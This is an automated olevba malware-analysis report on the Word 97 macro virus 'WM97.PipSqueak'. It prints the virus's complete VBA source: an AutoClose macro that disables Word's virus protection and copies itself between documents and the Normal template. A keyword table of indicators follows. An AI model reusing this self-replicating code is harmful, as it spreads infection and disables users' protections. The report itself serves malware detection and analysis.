olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip-92b6e8ae4b359b18b9dedb9e3f28db7f35d2d4f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip-92b6e8ae4b359b18b9dedb9e3f28db7f35d2d4f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO squeak.bas 
in file: Virus.MSWord.Pip-92b6e8ae4b359b18b9dedb9e3f28db7f35d2d4f7 - OLE stream: 'Macros/VBA/squeak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose(): On Error Resume Next: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False: Set Norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents: If Norm.Item("squeak").Name <> "squeak" Then Doc("squeak").Export "c:\squeak.dll": Set infect = NormalTemplate.VBProject: infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Doc.Item("squeak").Name <> "squeak" Then Norm("squeak").Export "c:\squeak.dll": Set infect = ActiveDocument.VBProject: infect.VBComponents.Import ("c:\squeak.dll"): Kill ("c:\squeak.dll")
If Day(Now) = 10 Then MsgBox "I would like you to meet WM97.PipSqueak", 0, "PipSqueak"
End Sub
'WM97.PipSqueak | Psyclone X | DVC
'Coded for smallest macro virus contest
'Please DO NOT spread
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |squeak.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

